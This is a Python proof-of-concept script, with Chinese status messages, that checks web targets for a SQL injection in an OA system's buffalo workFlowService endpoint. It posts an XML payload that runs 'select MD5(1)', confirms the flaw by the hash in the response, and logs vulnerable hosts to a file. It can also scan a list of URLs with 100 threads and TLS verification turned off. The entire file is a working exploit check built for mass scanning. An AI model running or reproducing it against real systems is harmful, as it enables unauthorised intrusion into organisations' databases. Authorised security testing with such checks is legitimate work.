import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {
    "Accept-Encoding": "identity", 
    "Accept-Language": "zh-CN,zh;q=0.8", 
    "Accept": "*/*", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", 
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3", 
    "Connection": "keep-alive", 
    "Cache-Control": "max-age=0"}
    data = "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>select MD5(1)</string> \r\n</buffalo-call>\r\n"
    payload = "/OAapp/bfapp/buffalo/workFlowService"
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests.post(url=target+payload,data=data,headers=headers,verify=False)
        if 'c4ca4238a0b923820dcc509a6f75849b' in rsp2.text:
            print(f'[+]{target}存在SQL注入')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在SQL注入')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()